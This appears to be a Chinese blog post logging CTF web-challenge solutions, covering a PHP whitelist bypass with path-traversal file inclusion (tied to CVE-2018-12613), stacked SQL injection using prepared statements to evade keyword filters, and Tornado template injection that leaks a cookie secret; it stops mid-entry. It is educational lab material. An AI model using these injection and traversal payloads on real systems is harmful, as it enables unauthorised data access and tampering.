<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.1.1">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">


  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.1.1',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="2020/2/4[HCTF 2018]WarmUp打开页面只有一个笑脸 查看源代码 访问source.php 然后开始代码审计 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    class">
<meta name="keywords" content="笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="一段时间的学习记录">
<meta property="og:url" content="http://yoursite.com/2020/07/02/一段时间的学习记录/index.html">
<meta property="og:site_name" content="张灵灵的笔记">
<meta property="og:description" content="2020/2/4[HCTF 2018]WarmUp打开页面只有一个笑脸 查看源代码 访问source.php 然后开始代码审计 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    class">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://i.loli.net/2020/02/22/a5TLbqRg6x8XADI.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/nJm7rk5ZNIy9TSa.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/TlbxHkRN6IJn8LU.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/UfJmsXB3cphDtn5.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/UqAGhX9SOWLNHxb.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/Ctj1wHTkebm4siO.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/ih9ntKR7OrlZ1Nf.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/FWfrxCd1JDnE3pI.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/KFfbQqul4DHaX67.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/qEcFS8zm64WioLv.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/XpPhWNkj4fGDzQ3.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/bjpu4tr5UzICmKO.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/gEJxGMdD4e7FLqN.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/YTQvxkN2qMXshJ3.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/tHZBonIA7EuQCDX.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/dTglyQbhMjU5kBP.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/TNWtlfuswy3j1k9.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/z5TNdtBZVsWmh8p.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/jeMU21NhaKpIlSH.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/vTtRXF9oZsqY1f6.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/GVkQozri8XYJ1uU.png">
<meta property="og:image" content="https://i.loli.net/2020/02/22/uzcjoFdWL1ximZQ.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/w9b5UhKTlGVRk7d.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/5uezq1ypTsCkA8w.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/FdIUYAKfs7gQklb.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/xZ82LkdYW3bogyj.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/qtsmA8U4XfxnEuY.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/1Nj9cFxiRMEJUHW.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/gX53FAZ9Bj4QrzD.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/cJ6tzHClmMvyQrD.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/3juW89ShFIPvwxi.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/tnRo6HYy9UTFpdG.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/KxldYEvei8Cf2Ot.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/BbE3V2iPqreH1Tx.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/xOQyvj3arTU6AwP.png">
<meta property="og:image" content="https://i.loli.net/2020/02/23/dNrfxzohUJFk1aO.png">
<meta property="og:image" content="https://i.loli.net/2020/03/07/xYkO1C647fpBQNh.png">
<meta property="og:image" content="https://i.loli.net/2020/03/07/aCTmh5puZNRXSgQ.png">
<meta property="og:image" content="http://yoursite.com/2020/07/02/一段时间的学习记录/C:/Users/Admin/AppData/Roaming/Typora/typora-user-images/image-20200307081644252.png">
<meta property="og:image" content="https://i.loli.net/2020/03/07/rdepiPv2oqNJLz6.png">
<meta property="og:image" content="https://i.loli.net/2020/03/07/Od1jfXPekhsYDi6.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20190929084930181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://i.loli.net/2020/03/24/Q6tTVnB3XFIPLrO.png">
<meta property="og:image" content="https://i.loli.net/2020/03/24/AlQYpn9tMwxGBaf.png">
<meta property="og:image" content="https://i.loli.net/2020/03/24/BY8XZiKdpyOF63b.png">
<meta property="og:image" content="https://i.loli.net/2020/03/24/6thO8gZ5SdnCXfK.png">
<meta property="og:image" content="https://i.loli.net/2020/03/24/cM5n3RJwHrmUN7b.png">
<meta property="og:image" content="http://yoursite.com/2020/07/02/一段时间的学习记录/C:/Users/Admin/AppData/Roaming/Typora/typora-user-images/image-20200324132020259.png">
<meta property="og:updated_time" content="2021-10-27T10:42:54.728Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="一段时间的学习记录">
<meta name="twitter:description" content="2020/2/4[HCTF 2018]WarmUp打开页面只有一个笑脸 查看源代码 访问source.php 然后开始代码审计 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    class">
<meta name="twitter:image" content="https://i.loli.net/2020/02/22/a5TLbqRg6x8XADI.png">





  
  
  <link rel="canonical" href="http://yoursite.com/2020/07/02/一段时间的学习记录/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>一段时间的学习记录 | 张灵灵的笔记</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">张灵灵的笔记</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tools">

    
    
    
      
    

    

    <a href="/tools/" rel="section"><i class="menu-item-icon fa fa-fw fa-users"></i> <br>tools</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/02/一段时间的学习记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content>
      <meta itemprop="description" content="夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="张灵灵的笔记">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">一段时间的学习记录

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-07-02 11:42:00" itemprop="dateCreated datePublished" datetime="2020-07-02T11:42:00+08:00">2020-07-02</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2021-10-27 18:42:54" itemprop="dateModified" datetime="2021-10-27T18:42:54+08:00">2021-10-27</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习笔记/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a></span>

                
                
              
            </span>
          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="2020-2-4"><a href="#2020-2-4" class="headerlink" title="2020/2/4"></a>2020/2/4</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>打开页面只有一个笑脸 查看源代码 访问source.php</p>
<p>然后开始代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先来看checkFile函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>]; <span class="comment">//白名单中提示有个hint.php</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;  <span class="comment">//如果$page不存在或者不是字符串则返回false</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;  <span class="comment">//拿$page与白名单去匹配若匹配成功则返回true</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(   <span class="comment">//取出$page中？前面的内容赋值给$_page</span></span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">//拿$_page与白名单匹配,若匹配成功则返回true</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);  <span class="comment">//把$page解码后赋值给$_page</span></span><br><span class="line">            $_page = mb_substr(   <span class="comment">//取出$_page中？前面的内容赋值给$_page</span></span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">//拿$_page与白名单匹配,若匹配成功则返回true</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>再来看看下面的语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>]) <span class="comment">//传入file参数</span></span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])  <span class="comment">//确保file参数中是字符串</span></span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])  <span class="comment">//对file用checkFile函数检查是否符合条件</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];  <span class="comment">//包含file参数</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>去看一下hint.php，得到了flag文件名称</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, <span class="keyword">and</span> flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>思路大概是这样的 先绕过checkFile函数，然后让file被包含，file可以是读flag的语句</p>
<p>首先确保$page是在白名单并且是字符</p>
<p>后面的三个if条件满足其一即可返回true并结束函数</p>
<p><strong>经过本地实验：检测的时候是检测 ？之前的    </strong></p>
<p><strong>包含的时候是包含 ？之后的</strong></p>
<p>payload：<code>file=source.php?../../../../../ffffllllaaaagggg</code></p>
<p>直接满足第一个if条件 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>ps：这里是phpMyAdmin的一个洞<code>CVE-2018-12613</code></p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>百度堆叠注入：</p>
<p><strong>堆叠注入原理</strong>:</p>
<blockquote>
<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在分号（;）结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。<br>用户输入：1; DELETE FROM products<br>服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products<br>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p>
</blockquote>
<p>看到url参数为?inject=1猜测是注入题目</p>
<p>输入1‘报错</p>
<p>输入1’#回显正常</p>
<p>1’ order by 1# 正常</p>
<p>1’ order by 2# 正常</p>
<p>1’ order by 3# 报错  只有两个字段</p>
<p>1’ union select 1,2;#  提示过滤了select，update，delete，drop，insert，where  .</p>
<p>1’;show databases;# 成功回显</p>
<p>1’; show tables;#  成功回显</p>
<p>当前数据库下 有<code>words</code>和<code>1919810931114514</code> 两个表</p>
<p>1’ ; show columns from words # 成功回显</p>
<p>1’ ; show columns from 1919810931114514 # 无回显</p>
<p>1’ ; show columns from <code>1919810931114514</code> # 有回显</p>
<p>看了看师傅们的wp：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">linux下不区分，windows下区分</span><br><span class="line">区别:</span><br><span class="line">单引号( ' )或双引号主要用于字符串的引用符号</span><br><span class="line">eg：mysql&gt; SELECT <span class="symbol">'hello</span>', <span class="string">"hello"</span> ;</span><br><span class="line"></span><br><span class="line">反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]</span><br><span class="line">eg:`mysql&gt;SELECT * FROM   `table`   WHERE `from` = <span class="symbol">'abc</span>' ;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/22/a5TLbqRg6x8XADI.png" alt="image-20200204154632002.png"></p>
<p><code>concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);</code>  拼接出sql语句</p>
<p><code>SET @sql=concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);</code> 存储sql语句</p>
<p><code>PREPARE ling from @sql;</code>   预定义SQL语句</p>
<p><code>EXECUTE ling;</code> 执行预定义SQL语句</p>
<p><code>?inject=&#39;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);PREPARE  ling from @sql;EXECUTE ling;#</code></p>
<p>得到flag</p>
<p>三种思路: <a href="https://www.jianshu.com/p/36f0772f5ce8" target="_blank" rel="noopener">https://www.jianshu.com/p/36f0772f5ce8</a> </p>
<p>alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100) character set utf8 collate utf8_general_ci not null;</p>
<h1 id="2020-2-5"><a href="#2020-2-5" class="headerlink" title="2020/2/5"></a>2020/2/5</h1><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>百度了是模板注入</p>
<p>构造payload获取cookie_secret</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '0791228c-a622-4d22-9ad2-2f1740a1bce0'&#125;</span><br></pre></td></tr></table></figure>
<p>cookie_secret：’0791228c-a622-4d22-9ad2-2f1740a1bce0’</p>
<p>filename： /fllllllllllllag </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(a)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(a.encode())</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line">cookie_secret = <span class="string">'0791228c-a622-4d22-9ad2-2f1740a1bce0'</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">'/fllllllllllllag '</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = md5( cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p> <a href="http://5458c2d2-a353-4909-b7a6-6d3edac1ea9e.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=0e98523cfbea442f437717a5e27b73b4" target="_blank" rel="noopener">http://5458c2d2-a353-4909-b7a6-6d3edac1ea9e.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=0e98523cfbea442f437717a5e27b73b4</a> </p>
<p>得到flag</p>
<p>主要考察的还是对模板的了解</p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>输入常见的sql语句回显nonono,应该是过滤了</p>
<p>输入</p>
<p> 1 ‘# 无回显</p>
<p>1# 回显正常</p>
<p>推测是整型注入</p>
<p>因为昨天刚做了堆叠注入</p>
<p>输入  1;show databases;# 看到了表名</p>
<p>输入1;show tables;# 看到只有一个flag表</p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11450409.html#一涉及知识点" target="_blank" rel="noopener">一、涉及知识点</a></p>
<ul>
<li><a href="https://www.cnblogs.com/20175211lyz/p/11450409.html#堆叠注入" target="_blank" rel="noopener">1、堆叠注入</a></li>
<li><a href="https://www.cnblogs.com/20175211lyz/p/11450409.html#set-sql_modepipes_as_concat将视为字符串的连接操作符而非或运算符" target="_blank" rel="noopener">2、<code>set sql_mode=PIPES_AS_CONCAT;</code>将<code>||</code>视为字符串的连接操作符而非或运算符</a></li>
<li><a href="https://www.cnblogs.com/20175211lyz/p/11450409.html#没有过滤的时候可以直接注入" target="_blank" rel="noopener">3、没有过滤<code>*</code>的时候可以直接注入<code>*</code></a></li>
</ul>
<p>源码： </p>
